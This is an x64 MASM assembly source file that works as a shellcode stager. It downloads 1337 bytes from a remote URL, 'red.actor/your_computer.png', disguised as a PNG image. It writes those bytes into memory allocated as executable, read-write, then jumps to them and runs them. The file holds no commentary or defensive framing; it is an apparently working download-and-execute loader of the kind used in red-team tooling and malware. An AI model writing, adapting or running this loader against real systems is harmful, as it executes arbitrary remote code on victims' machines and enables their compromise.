includelib wininet.lib
includelib kernel32.lib

.const 
PAYLOAD_SIZE dword  1337
PAYLOAD_LINK byte  'https://red.actor/your_computer.png', 0


.data
dwBytesRead			dword ?
hInternetSession	qword ?
hURL				qword ?
pPayload			qword ?
szAgent				byte  'TEST',0 

.code

	externdef InternetOpenA:proc
	externdef InternetOpenUrlA:proc
	externdef VirtualAlloc:proc
	externdef InternetReadFile:proc
	externdef InternetCloseHandle:proc


	public asmMain
asmMain proc
	
	sub		rsp, 38h

	lea     rcx, szAgent	
	xor     edx, edx				
	xor     r8d, r8d			
	xor     r9d, r9d	    		
	mov     qword ptr [rsp+20h], 0
	call	InternetOpenA
	mov     hInternetSession, rax


	mov     qword ptr [rsp+20h], 0			
	mov     qword ptr [rsp+28h], 80004400h 
	xor     r9d, r9d				
	xor     r8d, r8d						
	lea     rdx, PAYLOAD_LINK			
	mov		rcx, hInternetSession			
	call	InternetOpenUrlA
	mov		hURL, rax


	mov     r9d, 40h		
	mov     r8d, 3000h	
	mov     edx, PAYLOAD_SIZE  
	xor     ecx, ecx	
	call	VirtualAlloc
	mov		pPayload, rax


	lea		r9, dwBytesRead		 
	mov     r8d, PAYLOAD_SIZE    
	mov     rdx, pPayload		   
	mov     rcx, hURL			   
	call	InternetReadFile
	

	mov     rcx, hURL			  
	call	InternetCloseHandle

	mov     rcx, hInternetSession  
	call	InternetCloseHandle

	mov     rax, pPayload
	call	rax
	
	add		rsp, 38h
	
	ret

asmMain endp

end
